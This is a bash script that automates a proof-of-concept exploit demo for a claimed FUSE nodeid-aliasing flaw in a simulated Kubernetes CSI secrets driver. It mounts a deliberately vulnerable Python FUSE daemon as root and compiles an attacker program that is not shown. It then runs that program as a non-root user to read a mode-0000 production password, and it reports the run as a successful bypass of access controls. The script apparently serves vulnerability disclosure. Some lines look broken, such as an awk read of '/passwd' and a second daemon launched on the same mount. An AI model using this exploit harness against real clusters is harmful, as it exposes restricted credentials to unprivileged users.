#!/bin/bash
# run_demo.sh — Full automated demo of the FUSE nodeid aliasing exploit
#
# Simulates the Kubernetes CSI scenario end-to-end:
#   1. Starts a Python FUSE daemon (simulated CSI driver) as root
#   2. Compiles attacker_pod.c
#   3. Runs the attacker as a non-root user (default: $SUDO_USER or uid=1000)
#   4. Shows daemon + attacker output side by side
#   5. Cleans up automatically
#
# Usage:
#   sudo ./run_demo.sh [--uid UID]
#
# --uid UID   run the attacker as this uid (default: $SUDO_USER, then 1000)

set -euo pipefail

# ── Colors ───────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[1;33m'
BLU='\033[0;34m'; CYN='\033[0;36m'; MAG='\033[0;35m'
BOLD='\033[1m';   NC='\033[0m'

info()  { echo -e "${GRN}[demo]${NC}    $*"; }
step()  { echo -e "${MAG}[setup]${NC}   $*"; }
daemon(){ echo -e "${BLU}[csi]${NC}     $*"; }
warn()  { echo -e "${YEL}[warn]${NC}    $*"; }
die()   { echo -e "${RED}[error]${NC}   $*" >&2; exit 1; }
sep()   { echo -e "${BLU}────────────────────────────────────────────────────${NC}"; }

# ── Parse args ────────────────────────────────────────────────────────────────
ATTACKER_UID=""
while [[ $# -gt 0 ]]; do
    case "$1" in
        --uid) ATTACKER_UID="$2"; shift 2 ;;
        *) die "Unknown argument: $1" ;;
    esac
done

# ── Privilege check ───────────────────────────────────────────────────────────
[[ $EUID -ne 0 ]] && die "Run as root: sudo ./run_demo.sh"

# Resolve attacker uid: --uid arg > SUDO_USER > first uid≥1000 user > fail
if [[ -z "$ATTACKER_UID" ]]; then
    if [[ -n "${SUDO_USER:-}" ]]; then
        ATTACKER_UID=$(id -u "$SUDO_USER")
    else
        ATTACKER_UID=$(awk -F: '$3>=1000 && $3<65534 {print $3; exit}' /passwd 2>/dev/null \
                    || awk -F: '$3>=1000 && $3<65534 {print $3; exit}' /etc/passwd)
    fi
fi
[[ -z "$ATTACKER_UID" ]] && die "Cannot determine non-root uid. Pass --uid <uid>"
ATTACKER_USER=$(id -un "$ATTACKER_UID" 2>/dev/null || echo "uid=$ATTACKER_UID")
[[ "$ATTACKER_UID" -eq 0 ]] && die "Attacker uid must not be root"

# ── Prerequisites ─────────────────────────────────────────────────────────────
command -v python3 >/dev/null || die "python3 not found"
command -v gcc     >/dev/null || die "gcc not found"
[[ -e /dev/fuse ]] || { modprobe fuse 2>/dev/null || die "/dev/fuse missing and modprobe failed"; }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ATTACKER_SRC="$SCRIPT_DIR/attacker_pod.c"
[[ -f "$ATTACKER_SRC" ]] || die "attacker_pod.c not found in $SCRIPT_DIR"

# ── Paths ─────────────────────────────────────────────────────────────────────
MNTDIR="/tmp/k8s_secrets_mount"
ATTACKER_BIN="/tmp/attacker_pod_demo"
READY_FILE=$(mktemp /tmp/csi_ready_XXXXXX)
DAEMON_LOG=$(mktemp /tmp/csi_daemon_XXXXXX.log)
DAEMON_PID=""

# ── Cleanup ───────────────────────────────────────────────────────────────────
cleanup() {
    echo
    sep
    step "Cleaning up..."
    [[ -n "${DAEMON_PID:-}" ]] && kill "$DAEMON_PID" 2>/dev/null || true
    umount -l "$MNTDIR" 2>/dev/null || true
    rmdir  "$MNTDIR"    2>/dev/null || true
    rm -f "$READY_FILE" "$DAEMON_LOG" "$ATTACKER_BIN" 2>/dev/null || true
    step "Done."
}
trap cleanup EXIT SIGINT SIGTERM

# ── Header ────────────────────────────────────────────────────────────────────
echo
echo -e "${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}║   FUSE NODEID ALIASING — KUBERNETES CSI EXPLOIT DEMO          ║${NC}"
echo -e "${BOLD}║   CVE Candidate: inode mode poisoning via shared nodeid        ║${NC}"
echo -e "${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}"
echo
info "Kernel:          $(uname -r)"
info "CSI daemon:      root (this process)"
info "Pod attacker:    $ATTACKER_USER (uid=$ATTACKER_UID)"
info "Secrets mount:   $MNTDIR"
echo
warn "The CSI daemon returns nodeid=0x651b3722d014767b for BOTH:"
warn "  dev-shared-key   (mode=0644 — dev team can read)"
warn "  prod-db-password (mode=0000 — restricted to app service-account)"
warn "Both secrets contain the same value → same MD5 hash → same nodeid."
echo

# ── Compile attacker ──────────────────────────────────────────────────────────
sep
step "Compiling attacker_pod.c → $ATTACKER_BIN"
gcc -O2 -Wall -Wno-unused-result -o "$ATTACKER_BIN" "$ATTACKER_SRC" \
    || die "Compilation failed"
chmod +x "$ATTACKER_BIN"
chown "$ATTACKER_UID" "$ATTACKER_BIN"
step "Compiled OK"

# ── Write Python CSI daemon ───────────────────────────────────────────────────
sep
PYFILE=$(mktemp /tmp/csi_daemon_XXXXXX.py)
step "Writing Python CSI FUSE daemon → $PYFILE"

cat > "$PYFILE" << 'PYEOF'
#!/usr/bin/env python3
"""
Simulated Kubernetes Secrets Store CSI FUSE daemon.

Nodeid design (the vulnerable one):
  nodeid = int.from_bytes(MD5(secret_value)[:8], 'little') & 0x7fffffffffffffff

Two secrets share value "ProdDevKey#7x9\n" → same MD5 → same nodeid.
"""
import os, sys, struct, ctypes, errno as E, hashlib

FUSE_LOOKUP, FUSE_FORGET, FUSE_GETATTR = 1, 2, 3
FUSE_OPEN,   FUSE_READ,   FUSE_STATFS  = 14, 15, 17
FUSE_RELEASE,FUSE_FLUSH,  FUSE_INIT    = 18, 25, 26
FUSE_OPENDIR,FUSE_READDIR              = 27, 28
FUSE_RELEASEDIR, FUSE_ACCESS           = 29, 34
FUSE_BATCH_FORGET                      = 42
S_IFREG, S_IFDIR                       = 0o100000, 0o040000
DT_REG, DT_DIR                         = 8, 4

MNTDIR, READY_FILE = sys.argv[1], sys.argv[2]
ENTRY_TTL = 3600

BLU='\033[0;34m'; YEL='\033[1;33m'; RED='\033[0;31m'
GRN='\033[0;32m'; BOLD='\033[1m'; NC='\033[0m'

def log(msg):
    print(f"{BLU}[csi-fuse]{NC} {msg}", file=sys.stderr, flush=True)

def content_nodeid(data):
    h = hashlib.md5(data).digest()
    return int.from_bytes(h[:8], 'little') & 0x7FFFFFFFFFFFFFFF

SHARED_VALUE  = b"ProdDevKey#7x9\n"
COLLIDING_NID = content_nodeid(SHARED_VALUE)

SECRETS = {
    "dev-shared-key":   (COLLIDING_NID, S_IFREG | 0o644, SHARED_VALUE),
    "prod-db-password": (COLLIDING_NID, S_IFREG | 0o000, SHARED_VALUE),
}

log(f"MD5({repr(SHARED_VALUE.decode())[1:-1]})[:8] = {BOLD}0x{COLLIDING_NID:x}{NC}")
log(f"  dev-shared-key   → nodeid {BOLD}0x{COLLIDING_NID:x}{NC}  mode={GRN}0644{NC}")
log(f"  prod-db-password → nodeid {BOLD}0x{COLLIDING_NID:x}{NC}  mode={RED}0000{NC}  ← COLLISION")

IN_H  = struct.Struct('<IIQQIIII')
OUT_H = struct.Struct('<IiQ')
ATTR  = struct.Struct('<QQQQQQIIIIIIIIII')
AOUT  = struct.Struct('<QII')
EOUT  = struct.Struct('<QQQQII')
IOUT  = struct.Struct('<IIIIHHIIHH' + 'x'*32)
OOUT  = struct.Struct('<QII')
RIN   = struct.Struct('<QQIIQII')
SFST  = struct.Struct('<QQQQQIIIIIIIIII')
DIRH  = struct.Struct('<QQII')

def make_attr(ino, mode, size=0, nlink=1):
    return ATTR.pack(ino, size, 0,0,0,0, 0,0,0, mode, nlink, 0,0,0, 4096, 0)

def reply_ok(fd, uniq, body=b''):
    os.write(fd, OUT_H.pack(OUT_H.size + len(body), 0, uniq) + body)

def reply_err(fd, uniq, e):
    os.write(fd, OUT_H.pack(OUT_H.size, -e, uniq))

def on_init(fd, uniq, _b):
    reply_ok(fd, uniq, IOUT.pack(7, 39, 65536, 0, 0,0, 65536,0, 0,0))
    log(f"FUSE_INIT — secrets volume ready, awaiting pod requests...")
    open(READY_FILE, 'w').close()

def on_getattr(fd, uniq, nid):
    if nid == 1:
        a = make_attr(1, S_IFDIR | 0o755, nlink=2)
    else:
        a = make_attr(nid, S_IFREG | 0o000, size=len(SHARED_VALUE))
    reply_ok(fd, uniq, AOUT.pack(ENTRY_TTL, 0, 0) + a)

def on_lookup(fd, uniq, name):
    if name not in SECRETS:
        reply_err(fd, uniq, E.ENOENT)
        return
    nid, mode, data = SECRETS[name]
    perm = mode & 0o777
    color = GRN if (mode & 0o444) else RED
    log(f"FUSE_LOOKUP  '{YEL}{name}{NC}' → nodeid={BOLD}0x{nid:x}{NC}  mode={color}0{perm:04o}{NC}  entry_valid={ENTRY_TTL}s")
    a = make_attr(nid, mode, size=len(data))
    reply_ok(fd, uniq, EOUT.pack(nid, 1, ENTRY_TTL, ENTRY_TTL, 0, 0) + a)

def on_open(fd, uniq, nid):
    reply_ok(fd, uniq, OOUT.pack(nid, 0, 0))

def on_read(fd, uniq, nid, body):
    _fh, offset, size = RIN.unpack_from(body)[:3]
    reply_ok(fd, uniq, SHARED_VALUE[offset:offset+size])

def on_readdir(fd, uniq, _nid, body):
    _fh, offset, size = RIN.unpack_from(body)[:3]
    if offset > 0:
        reply_ok(fd, uniq, b''); return
    entries = [(1,'.',DT_DIR),(1,'..',DT_DIR)] + \
              [(nid,n,DT_REG) for n,(nid,_m,_d) in SECRETS.items()]
    buf, cur = b'', 0
    for ino, name, dtype in entries:
        nb = name.encode()
        rs = (DIRH.size + len(nb) + 7) & ~7
        cur += rs
        rec = DIRH.pack(ino, cur, len(nb), dtype) + nb
        buf += rec + b'\x00' * (rs - len(rec))
    reply_ok(fd, uniq, buf[:size])

def on_statfs(fd, uniq):
    reply_ok(fd, uniq, SFST.pack(1000,500,500,100,100,4096,255,4096,0,0,0,0,0,0,0))

def main():
    ffd = os.open("/dev/fuse", os.O_RDWR | os.O_CLOEXEC)
    libc = ctypes.CDLL(None, use_errno=True)
    opts = (f"fd={ffd},rootmode=40755,user_id=0,group_id=0"
            f",allow_other,default_permissions").encode()
    if libc.mount(b"k8s-secrets-csi", MNTDIR.encode(), b"fuse", 0, opts) != 0:
        print(f"mount() failed: {os.strerror(ctypes.get_errno())}", file=sys.stderr)
        sys.exit(1)
    log(f"Mounted at {BOLD}{MNTDIR}{NC}  (allow_other + default_permissions)")
    NO_REPLY = {FUSE_FORGET, FUSE_BATCH_FORGET}
    while True:
        try:
            msg = os.read(ffd, 1 << 17)
        except OSError:
            break
        if not msg: break
        hdr   = IN_H.unpack_from(msg)
        op, uniq, nid = hdr[1], hdr[2], hdr[3]
        body  = msg[IN_H.size:]
        name  = body.split(b'\x00')[0].decode(errors='replace')
        if   op == FUSE_INIT:                    on_init(ffd, uniq, body)
        elif op == FUSE_GETATTR:                 on_getattr(ffd, uniq, nid)
        elif op == FUSE_LOOKUP:                  on_lookup(ffd, uniq, name)
        elif op in (FUSE_OPEN, FUSE_OPENDIR):    on_open(ffd, uniq, nid)
        elif op == FUSE_READ:                    on_read(ffd, uniq, nid, body)
        elif op == FUSE_READDIR:                 on_readdir(ffd, uniq, nid, body)
        elif op == FUSE_STATFS:                  on_statfs(ffd, uniq)
        elif op in NO_REPLY:                     pass
        else:                                    reply_ok(ffd, uniq)

if __name__ == '__main__':
    main()
PYEOF

# ── Start CSI daemon ──────────────────────────────────────────────────────────
sep
step "Creating mount point: $MNTDIR"
mkdir -p "$MNTDIR"
chmod 755 "$MNTDIR"

step "Starting Python CSI FUSE daemon..."
rm -f "$READY_FILE"
python3 "$PYFILE" "$MNTDIR" "$READY_FILE" >"$DAEMON_LOG" 2>&1 &
DAEMON_PID=$!

step "Waiting for FUSE mount..."
for i in $(seq 1 50); do
    sleep 0.1
    [[ -f "$READY_FILE" ]] && break
    if ! kill -0 "$DAEMON_PID" 2>/dev/null; then
        cat "$DAEMON_LOG" >&2
        die "CSI daemon exited before completing mount"
    fi
done
[[ -f "$READY_FILE" ]] || die "CSI daemon did not signal ready after 5s"

# Flush dentry cache so the attacker starts with a clean state
echo 2 > /proc/sys/vm/drop_caches

sep
echo
daemon "CSI daemon output:"
cat "$DAEMON_LOG" | sed 's/^/  /'
echo

# ── Run the attacker ──────────────────────────────────────────────────────────
sep
echo
echo -e "${BOLD}${CYN}┌─ ATTACKER POD (uid=$ATTACKER_UID, no capabilities) ─────────────────┐${NC}"
echo

# Run attacker as non-root user; show live daemon log in parallel
python3 "$PYFILE" "$MNTDIR" /dev/null >>"$DAEMON_LOG" 2>&1 &   # keep daemon alive (already running)

# Tail the daemon log in background so daemon messages interleave
tail -f "$DAEMON_LOG" 2>/dev/null | sed "s/^/${BLU}[csi-live]${NC} /" &
TAIL_PID=$!

# Give tail a moment to start
sleep 0.1

# Run attacker as non-root
su -s /bin/sh -c "$ATTACKER_BIN" "$(id -un "$ATTACKER_UID")" 2>&1
ATTACK_RC=$?

kill "$TAIL_PID" 2>/dev/null || true
wait "$TAIL_PID" 2>/dev/null || true

echo
echo -e "${BOLD}${CYN}└──────────────────────────────────────────────────────────────────┘${NC}"
echo

# ── Result ────────────────────────────────────────────────────────────────────
sep
echo
if [[ $ATTACK_RC -eq 0 ]]; then
    echo -e "${BOLD}${RED}[RESULT]  EXPLOIT SUCCESSFUL${NC}"
    echo -e "          Attacker (uid=$ATTACKER_UID) read prod-db-password despite mode=0000."
    echo -e "          Kubernetes RBAC and CSI daemon access controls were bypassed."
    echo -e "          No capabilities, no sudo, no exploit code — only stat+stat+open."
else
    echo -e "${BOLD}${YEL}[RESULT]  Attack did not complete (exit $ATTACK_RC)${NC}"
    echo -e "          Check the daemon log above. Possible causes:"
    echo -e "          - Mount options differ (need allow_other + default_permissions)"
    echo -e "          - Kernel patched the fuse_change_attributes aliasing path"
    echo -e "          - Dentry cache was invalidated between step 2 and step 4"
fi

echo
echo -e "  Daemon log:   $DAEMON_LOG"
echo -e "  CVE report:   $SCRIPT_DIR/CVE_REPORT.md"
echo
rm -f "$PYFILE"
